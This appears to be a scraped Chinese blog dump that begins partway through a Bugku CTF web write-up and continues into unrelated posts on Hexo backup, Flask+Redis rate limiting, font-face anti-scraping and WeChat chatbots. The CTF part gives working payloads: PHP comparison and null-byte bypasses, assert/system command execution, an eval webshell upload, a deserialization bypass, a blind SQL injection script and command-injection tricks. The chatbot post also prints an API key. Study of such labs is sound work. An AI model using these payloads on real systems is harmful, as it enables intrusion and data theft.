&#39;no no no no no no no&#39;; return ;&#125;$data &#x3D; @file_get_contents($a,&#39;r&#39;);if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4) &#x2F;&#x2F;id要求弱等于0&#123; $flag &#x3D; &quot;flag&#123;***********&#125;&quot;&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125; 审计源码，传递三个参数id,a,b,要满足a变量不包含.符号，a的值为”bugku is a nice plateform!” ，id的值要求非0，又要弱等于0，b的长度大于5，还要满足字符串 1114 要与字符串 111 连接变量 b 的第一个字符构成的正则表达式匹配，变量 b 的第一个字符不等于整型数 4。file_get_contents()函数中可以使用php://input,因此可以利用伪协议、弱相等、eregi截断漏洞构造payload为/hello.php?id=0a&amp;a=php://input&amp;b=%00abcde，并在body中传入”bugku is a nice plateform!”,得到flag{ff7c252041021ba54808125cc93d1d06} ps：总结两个个php函数，stripos()，和eregi()以及其绕过姿势 stripos(string,find,start):其中string，hind为必填，start为选填，作用为查找find再string中第一次出现的位置，start为规定开始搜索的位置，如stripos(“You love php, I love php too!”,”PHP”)的返回值为9； eregi(a,string)：作用为判度string中是否存在a，且不区分大小写，如eregi(‘abc’,’b’)返回True； eregi绕过姿势：eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据，在url中可以用%00空字符的方式进行截断； Web 22tip: 送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’]) 将提示中的代码还原 assert($_GET[&#39;s&#39;]) ,可知要通过get请求传递一个参数s，并进行assert操作，可以利用scandir函数或者system函数来获取flag： 方法一：利用scandir函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=print_r(scandir(‘./‘))， 方法二：利用system函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=system(‘ls’)； 得到flag文件后直接在url访问，得到flag{fc7cad1203f0a19783eee71ae8e43379} ps: scandir()函数作用为列出指定目录中的所有文件和目录；system()函数用于执行系统命令； xxx二手交易市场tip: 本人现实碰到的题目，无提示勿问 这道题的注册功能已经修复过了，最初版本的注册功能是无效的，还需要猜测账号和密码(123456)。。。 注册一个账号登录，在头像位置存在文件上传漏洞，上传一个图片通过burpsuite抓包，数据以base64编码的数据流形式传输，将data:image/jpeg修改为data:image/php，文件上传成功且后缀变为php，可以通过data属性控制文件后缀，然后将一句话木马进行base64编码，替换图片部分的数据流，&lt;?php @eval($_POST[cmd]); ?&gt;的base64编码为PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==，因此构造payload为image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==，上传webshell后用蚁剑连接，在当前目录下得到flag{06add122126c9092268739112c89d62d} 冬至红包tip: 闪电十六鞭 审计源码，get传递的flag参数需要满足以下条件： flag变量长度等于$exam的长度，长度为49 flag变量不能包含` , “ , . , \\ , ( , ) , [ , ] , _ , flag , echo , print , require , include , die , exit ; eval($_GET[‘flag’]) === sha1($flag) 其中第三点等于sha1可以利用短标签绕过判断，直接利用eval输出$flag变量的值，构造payload绕过对flag字符串的过滤，payload为?flag=$a=&#39;blag&#39;;$a&#123;0&#125;=&#39;f&#39;;?&gt;11111111111111111;&lt;?=$$a;?&gt;,得到flag{78062956} ；其中?&gt;用于闭合开头的&lt;?php 标记，111…111是用来填充长度的， ps: 总结一下短标签的用法。&lt;?=$var?&gt;和&lt;?php echo $var; ?&gt;的效果是一样的，用于输出某个变量； Web 23tip: 字符？正则？ 要求get请求的参数id满足正则匹配preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match)，构造payload为?id=keykeyaaaakey:/a/keya:得到flag{eced261c98e527123293bc4c3c168c95} ps1:trim()函数：移除字符串两侧的空白字符或其他预定义字符。 ps2:正则规则 ‘/xxxx/i’：两端的两个斜杠为开始和结束标记，i表示不区分大小写； . ：匹配任意一个字符(注意只能时一个字符) .* : 匹配任意多个任意字符(任意多个也可以是0个) {m,n} : 匹配m~n个任意字符(包含m，但不包含n) [a-z] : 匹配一个a-z之间的任意一个字符 [[:punct:]]: 匹配一个特殊字符，如:,@,:等 Web 24tip: 前女友 查看页面源代码，发现链接两个字会跳转到提示页面，进入提示页面后进行代码审计 12345678910if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; $_GET[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; $v3 &#x3D; $_GET[&#39;v3&#39;]; if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125; md5绕过姿势在Web16已经介绍了，同时利用strcmp函数的漏洞，构造payload为?v1[]=1&amp;v2[]=2&amp;v3[]=1，即可得到flag{1f8906753838d5dd46af3f343d5b43f2} ps：strcmp ( string $str1 , string $str2 )介绍： 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。在5.3之前的php中，当这个函数接受到了不符合的类型，显示了报错的警告信息后，将return 0 ，也就是虽然报了错，但却判定其相等了。因此可以利用数组绕过strcmp的判断。 Web 25tip: SQL约束攻击 在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。 在SQL中执行insert命令时，会受到字段长度的约束。例如以下，设置了name字段最大长度为8，当输入了长度大于8的字符串时如vampire123，insert命令会只截取前8位字符，最终插入数据位vampire1，如下图所示(经本地测试，这种情况存在于mysql 5.5.35版本，在mysql 5.7.23版本会报错) 在SQL中执SELECT处理时，字符串末尾的空格会被忽略。换句话说select * from users where name=”abc”等同于where name=”abc &nbsp;&nbsp;&nbsp;”；如下所示，在执行select查询时，返回了vampire1的结果，忽略了后面的空格， 这个题利用了这两个关键点，先通过注册，利用空格注册一个admin账户，如账号为”admin &nbsp;&nbsp;&nbsp;1”；(其中admin和1之间包含若干个空格))，再通过账号密码登录，即可获得flag{f2b6e02fcb3c729900f8255eb2777138} Web 29tip: 各种绕过 sha1绕过可以利用数组绕过强相等判断，和md5数组绕过方法相同，因此可构造payload为?id=margin&amp;uname[]=1，同时post请求passwd[]=2，即可得到flag{9cab7b5704ec4d45953c039c22ff4edd} Web 34tip: hint:文件包含 查看页面源代码，发现提示访问upload.php，经测试能够图片马，结合提示图片马+文件包含getshell，经测试&lt;?php和?&gt;被过滤了，使用如下payload为&lt;script language=&quot;php&quot;&gt;@eval($_POST[cmd])&lt;/script&gt;成功上传webshell，蚁剑连接在根目录得到flag{1039c22c0a08a1523629a64d2b1382ea} Web 32tip: 求getshell 这道题有三道题需要绕过: multipart/form-data: 后端会判断是否存在这个字段，如果存在则继续判断后缀，可用大写绕过如Multipart/form-data(个人猜测这一步是模仿防火墙的检测功能) 后缀白名单：经测试php4在白名单里，可绕过 type检测：将Content-Type改为image/jpeg，可绕过 以上三处绕过后可成功上传php4文件，蚁剑连接，在根目录得到flag{875905e02b46bb7322456dafa67b82d0}，具体的后端检测函数可以蚁剑连接后查看源代码分析 安慰奖tip: flag{} 根据提示，下载index.php.bak审计源码，需要进行反序列化操作，且绕过wake_up()和cmd过滤，因此构造payload为?code=O:3:”ctf”:3:{s:11:”%00*%00username”;s:5:”admin”;s:6:”%00*%00cmd”;s:12:”tac%20flag.php”;}，即可得到flag{Unser1alize_and_2CE_Add} ps: 介绍三个点，第一个是wake_up绕过，第二个是public，protect和private在序列化中的区别，第三个是读文件的命令： 当成员属性数目大于实际数目时可绕过wakeup方法，如上述payload中”ctf”:3，实际上类ctf中的属性只有两个，而payload中设为3，即可绕过wake_up； Public属性序列化后格式:成员变量名；Private属性序列化后格式:%00类名%00成员变量名；Protected属性序列化后的格式:%00*%00成员变量名 linux中读取文件的命令：cat | tac | more | less | head | tail |nl 等 Web 36tip: 全都过滤了绝望吗? 登录后先根据sql-fuzz字典和burpsuite的返回长度进行fuzz测试看过滤了哪些字符串，经测试逗号被过滤了，但异或符号 ^ 还可以使用，当uname输入非admin时，返回值都为username error，当uname输入admin时，返回值为password error，说明用户名为amdin，接下来开始利用异或注入： 判断密码长度：uname=admin&#39;^(length(passwd)=32)^&#39; 最后的 ‘ 用来闭合原本的右括号，这个结果返回empty，因此页面显示username error；分析返回结果时需要注意sql运算符的优先级， ^ &gt; = ，所以先进行异或运算，最后进行比较运算，且字符串与数字做异或运算时，会先进行类型转换，如’admin’^1相当于0^1；此题中，’admin’相当于0，(length(passwd)=32)相当于1，’’相当于0，所以0^1^0为1，最后进行uname的比较运算，即在数据库中匹配uname=1的数据，而数据库中的uname为’admin’，在进行’admin’=1比较时，’admin’先转换成整型0，0=1为false，所以返回empty。 同理，当payload中密码长度修改为31时，异或运算相当于0^0^0，结果为0，在做比较运算时，uname=0，而’admin’转化为0，0=0为true，则查询成功，uname绕过了，因此页面显示passwd error；故可以通过这一点判断密码长度为32；猜测密码为md5密文； 判断密码每一位字符：uname=admin&#39;^(ascii(substr((passwd)from(1))=52)^&#39;用于判读密码第一位的字符(注意mysql和php不同，substr的第一位不是从0开始，而是1)；substr((passwd)from(1))利用了括号绕过逗号，相当于substr(passwd,1)。和判断密码长度的原理相同，当密码第一位判断正确时，返回username error，错误时返回passwd error，根据返回结果的不同爆破出32位密码，脚本如下： 123456789101112131415import requestsurl&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:10945&#x2F;login.php&#39;mima&#x3D;&#39;&#39;r&#x3D;requests.session()for i in range(1,33): for j in range(48,123): data&#x3D;&#123; &#39;uname&#39;:f&quot;admin&#39;^(ascii(substr((passwd)from(&#123;i&#125;)))&#x3D;&#123;j&#125;)^&#39;&quot;, &#39;passwd&#39;:&#39;123&#39; &#125; resp&#x3D;r.post(url,data&#x3D;data).text if &#39;username&#39; in resp: print(f&quot;第&#123;i&#125;个：&#123;chr(j)&#125;&quot;) mima+&#x3D;chr(j)print(mima) 得到32位密文后，放入somd5解密，得到密码bugkuctf，利用账号admin和密码bugku登录后，进入新的页面，该页面具有系统命令执行功能，但过滤部分字符串，获得flag的payload有很多，下面列举几个并作说明： env :用于输出系统环境变量，这道题中系统环境变量中有flag； {echo,$FLAG}：也是输出系统环境变量，但是只输出$FLAG一个变量 {cat,/flag}：绕过空格限制，读取根目录下flag文件； cat&lt;/flag：绕过空格限制， cat&lt;&gt;/flag：绕过空格限制； a=$‘\\x20/flag’&amp;&amp;cat$a：\\x20转换为字符串就是空格; 还有两个绕过空格的方法，但是本题中给过滤掉了： cat${IFS}/flag cat$IFS$9/flag 通过以上即可得到flag{a76e888fdf053f9d20a76eab8dcf1a99} Web**tip: **","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"Bugku","slug":"Bugku","permalink":"https://wxt406611016.github.io/tags/Bugku/"}]},{"title":"github之hexo源码备份和应用","slug":"github之hexo源码备份和应用","date":"2020-11-08T16:00:00.000Z","updated":"2021-01-28T14:40:27.090Z","comments":true,"path":"2020/11/09/github之hexo源码备份和应用/","link":"","permalink":"https://wxt406611016.github.io/2020/11/09/github%E4%B9%8Bhexo%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E5%92%8C%E5%BA%94%E7%94%A8/","excerpt":"对于写博客的人来说，换电脑时如何迁移博客是比较头疼的，本文介绍了利用git分支保存hexo博客源码的方法，当换电脑时只需要将hexo源码git下来即可。","text":"对于写博客的人来说，换电脑时如何迁移博客是比较头疼的，本文介绍了利用git分支保存hexo博客源码的方法，当换电脑时只需要将hexo源码git下来即可。 1.使用git分支保存hexo博客源码具体操作请跳转到页面。 2.为新电脑添加SSH keys当你需要在一台新设备上继续写博客上，可以通过github的源码来快速搭建原环境，为了能够使用git clone、push等操作，需要在新电脑上设置github环境，并将SSH keys存储到github中，具体操作请跳转到我之前的一篇博客中4，5，6节部分。 3.将hexo源码clone到本地新设备空空如也，需要将hexo源码克隆到本地，具体操作也在第一步的文档中，跳转！ 4.配置hexo所需环境将源码clone到本地还不够，还需要配置hexo所需环境，如nodejs，npm。。。这里我们使用nvm来安装，具体操作也在第二步的文档中，跳转！中从第2节开始看。 5.Deploy和Push到这一步基本都配置好了，需要测试使得 hexo d操作能部署博客到github博客仓库的显示分支，_config.yml中默认将hexo d部署到master分支，所以不用修改，直接hexo g，hexo d一顿操作就完事儿了，如果想在本地先调试，就在hexo g后跟一个hexo s。 git push操作能将博客源码更新到github博客仓库的源码分支， (可选)如果你是从github上clone下来的源代码，则不需要本步骤。否则的话先本地关联远程仓库： git remote add origin git@github.com:yourblog/yourblog.github.io.git 接着git三部曲就完事儿了: 123git add . #添加所有文件到暂存区git commit -m &quot;date&quot; #提交，标记我此处用了date字符串git push origin source #推送到源码分支source","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://wxt406611016.github.io/tags/hexo/"}]},{"title":"flask+redis限制ip访问速率","slug":"flask+redis-限制ip访问频率","date":"2020-04-10T16:00:00.000Z","updated":"2021-01-28T14:34:37.428Z","comments":true,"path":"2020/04/11/flask+redis-限制ip访问频率/","link":"","permalink":"https://wxt406611016.github.io/2020/04/11/flask+redis-%E9%99%90%E5%88%B6ip%E8%AE%BF%E9%97%AE%E9%A2%91%E7%8E%87/","excerpt":"上篇介绍了利用font-face进行反爬虫，这篇介绍另一种常见方法–验证码校验，对频繁访问的ip进行限制，强制要求验证码验证，验证成功方可继续访问。 1.限制逻辑/策略： 利用request.remote_addr获取客户端ip； 客户端访问时，服务器判断redis中是否有客户端ip； 若不存在，将客户端ip存入redis中，对应值设为1；若存在，客户端ip对应值+1； 若redis中客户端ip对应值在5分钟内&gt;5，即5分钟内访问页面超过5次，则视为恶意ip，跳转至验证码校验页面； 验证成功后，向后端请求过渡函数B，进行redis操作，B函数的功能为将验证成功的ip从redis中删除，删除后再重定向至开始页面；","text":"上篇介绍了利用font-face进行反爬虫，这篇介绍另一种常见方法–验证码校验，对频繁访问的ip进行限制，强制要求验证码验证，验证成功方可继续访问。 1.限制逻辑/策略： 利用request.remote_addr获取客户端ip； 客户端访问时，服务器判断redis中是否有客户端ip； 若不存在，将客户端ip存入redis中，对应值设为1；若存在，客户端ip对应值+1； 若redis中客户端ip对应值在5分钟内&gt;5，即5分钟内访问页面超过5次，则视为恶意ip，跳转至验证码校验页面； 验证成功后，向后端请求过渡函数B，进行redis操作，B函数的功能为将验证成功的ip从redis中删除，删除后再重定向至开始页面； 2.代码实现限制逻辑：后端代码如下，index()方法用于判断redis中是否存在客户端ip，以及ip对应值是否大于5： 1234567891011@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])def index(): ip&#x3D;request.remote_addr if(rs.exists(ip)): #rs可操作redis rs.setrange(ip,0,int(rs.get(ip))+1) else: rs.set(ip,1,ex&#x3D;300) #5分钟5次 if (int(rs.get(ip))&lt;6): return render_template(&#39;index.html&#39;) #正常返回 else: return render_template(&quot;antibot.html&quot;,ip&#x3D;ip,secret&#x3D;secret) #返回验证码校验页面 如果跳转至antibot.html(验证码校验页面)后，前端通过js对参数a进行base64加密，并带参数访问/mid页面，之所以要带参数，是为了在后端验证参数是否有效(即判断是否是通过验证码校验后跳转而来)： 12345678910&lt;script&gt;......onSuccess: function() &#123; document.getElementById(&#39;msg&#39;).innerHTML &#x3D; &#39;登录成功！&#39; var a&#x3D;&quot;&#123;&#123;ip&#125;&#125;&quot;+&quot;&#123;&#123;secret&#125;&#125;&quot; &#x2F;&#x2F;secret是从后端传来的随机密钥 a&#x3D;window.btoa(a) &#x2F;&#x2F;对变量a进行base64加密 window.location.href&#x3D;&quot;&#x2F;mid?id&#x3D;&quot;+a &#125;,......&lt;&#x2F;script&gt; mid()方法用于通过验证码校验后，将ip从redis中删除，并重定向至开始页面： 1234567891011@app.route(&#39;&#x2F;mid&#39;, methods&#x3D;[&#39;GET&#39;])def mid(): cmp&#x3D;request.args.get(&#39;id&#39;,&#39;0&#39;) ip&#x3D;request.remote_addr sec&#x3D;ip+secret #secret作为随机密钥进行加密 result&#x3D;base64.b64encode(sec.encode()) result&#x3D;str(result)[2:-1] if(cmp&#x3D;&#x3D;result): #判断前端js传来的参数是否有效 rs.delete(ip) response &#x3D; redirect(url_for(&#39;index&#39;)) return response 3.效果展示：打开flask项目，可以正常访问：刷新5次后，触发了限制ip策略，返回验证码校验界面：验证成功后，成功返回开始页面。从而实现了flask上用redis进行限制ip访问频率。 PS:若设置反向代理需注意！！！如果设置了反向代理的话，request.remote_addr则不会返回客户端的真实ip。以nginx反向代理为例，客户想要访问服务器，实际请求路线是client-&gt;nginx-&gt;server，而request.remote_addr表示的是上一级ip，而server的上一级ip是nginx服务器的ip. 解决办法：以nginx为例，在配置文件中使用X-Forwarded-For，然后后端获取ip方式由 ip=request.remote_addr更改为ip = request.headers.getlist(&quot;X-Forwarded-For&quot;)[0] 即可。 访问上图中我的web项目，点击链接即可， 如有错误或建议，请在评论处指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"ip限制","slug":"ip限制","permalink":"https://wxt406611016.github.io/tags/ip%E9%99%90%E5%88%B6/"}]},{"title":"反爬虫策略之font-face","slug":"反爬虫策略之font-face","date":"2020-03-01T16:00:00.000Z","updated":"2021-01-28T14:33:04.238Z","comments":true,"path":"2020/03/02/反爬虫策略之font-face/","link":"","permalink":"https://wxt406611016.github.io/2020/03/02/%E5%8F%8D%E7%88%AC%E8%99%AB%E7%AD%96%E7%95%A5%E4%B9%8Bfont-face/","excerpt":"在互联网快速发展的时代里，爬虫可以说是无处不在。各类热搜以及热点新闻，时时刻刻都在被爬虫获取。如果开发者并不想让内容大范围传播呢？如何应对爬虫呢？常见的方法有验证码验证，以及对频繁登陆ip进行屏蔽，除此之外，还有一种通过font-face自定义字体的方式，可以让爬取到的内容和网页显示的内容完全不一样，从而产生一种是否爬错内容了的感觉。","text":"在互联网快速发展的时代里，爬虫可以说是无处不在。各类热搜以及热点新闻，时时刻刻都在被爬虫获取。如果开发者并不想让内容大范围传播呢？如何应对爬虫呢？常见的方法有验证码验证，以及对频繁登陆ip进行屏蔽，除此之外，还有一种通过font-face自定义字体的方式，可以让爬取到的内容和网页显示的内容完全不一样，从而产生一种是否爬错内容了的感觉。 1.font-face介绍：谈到font-face，也许很多人并不熟悉，但是说到应用此技术的公司，大家肯定都很熟悉了，58同城，猫眼电影等，都采用了font-face策略来应对爬虫。以58同城为例，打开审查元素，发现页面内的3室2厅1卫 和120㎡中的数字均变成了乱码 —-“驋室麣厅龒卫”,”龒麣龤㎡”。所以即便爬虫找到了正确位置，也依然无法获得正确信息。 2.font-face原理：仔细观察审查元素信息，在styles栏里发现了font-family，这就是自定义字体，可以把乱码显示成正常的数字。于是我们要找到font-family字样，右键点击网页源代码，搜索font-family，找到@font-face等关键字，通过分析data:application/font-ttf，可以猜测后面长串字符串应该是对某个ttf字体进行了base64编码。上python，解码生成ttf字体文件。 12345678910from fontTools.ttLib import TTFontimport base64import iokey&#x3D;&#39;&#39;&#39;AAEAAAALAIAAAwAwR1NVQiCLJXoAAAE.......AAAA #key值为源代码中的长串字符串&#39;&#39;&#39;data &#x3D; base64.b64decode(key) #base64解码fonts &#x3D; TTFont(io.BytesIO(data)) #生成二进制字节fonts.save(&#39;font-face.ttf&#39;) 将生成的font-face.ttf通过百度字体编辑器打开，可以看到对所有数字进行了重新编码。是不是有点儿疑惑？怎么对数字重新编码？？？其实也可以理解为是对编码对应的图形进行了改变，比如同样是编码(0x9a4b)，在常规字体中是”驋”的模样可能在B字体中就是”2”的模样，在自己设计的字体里，可以任性的把(0x9a4b)编码对应的图形设计成”2”的形状，举个例子:同样是(0x9a4b)编码，在字体A中，你认为是2，在字体B中，即便和字体A中形状不一样，你一样认为是2，但在自定义字体中，你会认为是w。同样的道理，我们可以把常规字体中的乱码，设计成数字的形状。所以在自定义字体的基础上，我们可以变相认为对字体进行了加密，从而起到保护重要数据的作用。 3.实现font-face：理解了font-face的原理后，我们可以将font-face策略应用到自己的web项目中。为了简便操作，我直接用了第二步中在58同城网站下载的字体hhh(自行设计字体也很cool，想怎么画怎么画)。在前端html文件中加入以下内容: 123456789&lt;style&gt;@font-face&#123;font-family:&#39;secret&#39;;src:url(&#39;data:application&#x2F;font-ttf;charset&#x3D;utf-8;base64,AAEAAAALAIAAAwAwR1NVQiCLJXoA.......AAAAAAAAA&#39;)format(&#39;truetype&#39;)&#125;.strongbox&#123;font-family:&#39;fangchan-secret&#39;,&#39;Hiragino Sans GB&#39;,&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;宋体&#39;!important&#125;&lt;&#x2F;style&gt;&lt;style&gt;.font&#123;font-family:&#39;secret&#39;,&#39;Hiragino Sans GB&#39;,&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;\\5B8B\\4F53&#39; !important&#125;&lt;&#x2F;style&gt; 上面一段的作用为引入名叫”secret”的自定义字体,然后通过style设计.font，使所有class为”font”的标签应用此自定义字体。换言之，当你想用自定义字体时，在相应的标签中加入class=”font”，如下html源码和前端显示结果:可见2020 04-27日期字样在源码中显示为乱码。访问上图中我的web项目，点击链接即可，(暂时只对页面右侧一栏中的日期做了font-face加密。) 如有错误或建议，请在评论处指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"font-face","slug":"font-face","permalink":"https://wxt406611016.github.io/tags/font-face/"}]},{"title":"python+微信+腾讯智能闲聊","slug":"python实现微信调用腾讯智能闲聊","date":"2020-02-07T16:00:00.000Z","updated":"2021-01-28T14:35:44.307Z","comments":true,"path":"2020/02/08/python实现微信调用腾讯智能闲聊/","link":"","permalink":"https://wxt406611016.github.io/2020/02/08/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E8%85%BE%E8%AE%AF%E6%99%BA%E8%83%BD%E9%97%B2%E8%81%8A/","excerpt":"继上一篇调用图灵机器人的玩法后，不满于每天100条的限额，于是！！！又找到了腾讯云产品-智能闲聊，免费！无限额！申请智能闲聊","text":"继上一篇调用图灵机器人的玩法后，不满于每天100条的限额，于是！！！又找到了腾讯云产品-智能闲聊，免费！无限额！申请智能闲聊 1.构建调用api文件：由于wxpy库没有集成腾讯智能闲聊的api，我们需要自己配置接口，所以会比调用图灵机器人显得麻烦。上python，下面是api.py的内容，主要用于向腾讯云发送请求，并获取回复内容，相当于一个调用api。如下api.py: 123456789101112131415161718192021222324252627282930313233343536373839404142###api.py###import hashlibimport timeimport requestsimport randomimport stringfrom urllib.parse import quote def curlmd5(src): m &#x3D; hashlib.md5(src.encode(&#39;UTF-8&#39;)) return m.hexdigest().upper() # 将得到的MD5值所有字符转换成大写 def get_params(plus_item): #用于返回request需要的data内容 global params t &#x3D; time.time() #请求时间戳（秒级）,（保证签名5分钟有效） time_stamp&#x3D;str(int(t)) nonce_str &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 10)) # 请求随机字符串，用于保证签名不可预测 app_id&#x3D;&#39;2135462408&#39; # 修改成自己的id app_key&#x3D;&#39;w3Lv6zsb95T89fay&#39; # 修改成自己的key params &#x3D; &#123;&#39;app_id&#39;:app_id, &#39;question&#39;:plus_item, &#39;time_stamp&#39;:time_stamp, &#39;nonce_str&#39;:nonce_str, &#39;session&#39;:&#39;10000&#39; &#125; sign_before &#x3D; &#39;&#39; for key in sorted(params): #要对key排序再拼接 sign_before +&#x3D; &#39;&#123;&#125;&#x3D;&#123;&#125;&amp;&#39;.format(key,quote(params[key], safe&#x3D;&#39;&#39;)) # 拼接过程需要使用quote函数形成URL编码 sign_before +&#x3D; &#39;app_key&#x3D;&#123;&#125;&#39;.format(app_key) # 将app_key拼接到sign_before后 sign &#x3D; curlmd5(sign_before) params[&#39;sign&#39;] &#x3D; sign # 对sign_before进行MD5运算 return params #得到request需要的data内容 def get_content(plus_item): global payload,r url &#x3D; &quot;https:&#x2F;&#x2F;api.ai.qq.com&#x2F;fcgi-bin&#x2F;nlp&#x2F;nlp_textchat&quot; # 聊天的API地址 plus_item &#x3D; plus_item.encode(&#39;utf-8&#39;) payload &#x3D; get_params(plus_item) r &#x3D; requests.post(url,data&#x3D;payload) #带参请求api地址 result&#x3D;r.json()[&quot;data&quot;][&quot;answer&quot;] return result #获得返回内容 2.与智能闲聊进行聊天终于将前提基础工作完成了，调用api构建好后，调用智能闲聊也就很简单了，调用wxpy库，初始化和构建自动发送、回复函数和上一章都一样。为了简化工作，本例中只实现自动回复功能，也是最常用的功能。依然上ai.py的代码，用于聊天。ai.py如下： 1234567891011121314151617181920from wxpy import *from ai import * #导入上一步构建的ai.py文件bot &#x3D; Bot()friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]@bot.register(friend)def auto_reply(msg): a&#x3D;msg.text answer&#x3D;get_content(a) if answer&#x3D;&#x3D;&#39;&#39;: #防止返回内容为空 for i in range(2): time.sleep(2) answer&#x3D;get_content(a) if answer!&#x3D;&#39;&#39; and answer!&#x3D;&quot;emmmm，我不是很懂你的意思&quot;: break else: answer&#x3D;&quot;emmmm，我不是很懂你的意思&quot; return &#39;[Stephen] &#123;&#125; &#39;.format(answer)bot.join() 由于访问腾讯api的时候，偶尔会返回空内容，为了避免这种情况，当返回空时，隔2s再请求一次，这般重复3次，如果依然返回空，则自动将返回值设为”emmmm，我不是很懂你的意思”。 3.效果展示：ps：我已将智能闲聊的名字设为了”Stephen”，上图最重要：腾讯智能闲聊的智能化程度也挺高，日常闲聊也没有太大问题，有些回答甚至比图灵机器人还要讨喜，各有千秋吧。最关键的是免费！不限额！尽管wxpy功能很强大，但是部分用户无法登陆微信网页版，也就无法体验wxpy的服务了，可以说是很可惜了！ 如有错误或建议，请在评论处指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"智能闲聊","slug":"智能闲聊","permalink":"https://wxt406611016.github.io/tags/%E6%99%BA%E8%83%BD%E9%97%B2%E8%81%8A/"}]},{"title":"python实现微信自动回复+图灵机器人","slug":"python实现微信自动回复+图灵机器人","date":"2020-01-11T16:00:00.000Z","updated":"2021-01-28T14:35:53.483Z","comments":true,"path":"2020/01/12/python实现微信自动回复+图灵机器人/","link":"","permalink":"https://wxt406611016.github.io/2020/01/12/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%A4%8D+%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/","excerpt":"前段时间无意间看到wxpy，彷佛捡到了宝，立马开始探索用python玩微信，可以将很多操作自动化，既方便又有趣。wxpy是 在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展，其中就包括平时常用的自动回复，主动发消息，甚至还能引入智能聊天机器人。话不多说，上python！更多玩法关注wxpy官方文档","text":"前段时间无意间看到wxpy，彷佛捡到了宝，立马开始探索用python玩微信，可以将很多操作自动化，既方便又有趣。wxpy是 在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展，其中就包括平时常用的自动回复，主动发消息，甚至还能引入智能聊天机器人。话不多说，上python！更多玩法关注wxpy官方文档 1.初始化：1234from wxpy import * # 导入模块bot &#x3D; Bot() # 初始化机器人，扫码登陆 friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0] #搜索昵称为&quot;AIbot&quot;的好友group &#x3D; bot.groups().search(&#39;test&#39;)[0] #搜索名称为&quot;test&quot;的群聊 2.自动发送、回复指定消息：自动发送消息： 12friend.send(&#39;for test&#39;) #自动向&quot;AIbot&quot;好友发送消息group.send(&#39;for test&#39;) #自动向&quot;test&quot;群组发送消息 自动回复消息： 12345678910@bot.register(friend) # 回复 friend 的消息def reply_my_friend(msg): return &#39;received: &#123;&#125;)&#39;.format(msg.text) # 回复消息内容@bot.register([friend,Group]) #自动回复所有好友和群聊def auto_reply(msg): if isinstance(msg.chat, Group) and not msg.is_at: return #如果是群聊，但没有被 @，则不回复 else: return &#39;收到消息: &#123;&#125;&#39;.format(msg.text) # 回复消息内容 3.引入图灵机器人：引入智能聊天机器人，才是python玩微信的精髓hhh。wxpy库目前提供了两种自动聊天机器人接口，图灵机器人和小i机器人，本文中选择受众度更高的图灵机器人。调用图灵机器人需要申请api-key，申请点击链接即可！ 下面给出图灵机器人自动回复好友”AIbot”消息的全代码： 12345678910from wxpy import *bot &#x3D; Bot()friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]tuling &#x3D; Tuling(api_key&#x3D;&#39;4e2xxxxxxxa8&#39;) #api_key为你申请的api_key@bot.register(friend)def reply_my_friend(msg): tuling.do_reply(msg) #图灵机器人自动回复bot.join() #保持登陆状态 话不多说，上图，日常基本聊天还是可以的：图灵机器人的智能化程度还是很高的，日常聊天都很ok。但是虽然是免费的，但是有限制次数，认证后一天100条。总的来说日常简短的聊天还是不错的选择。 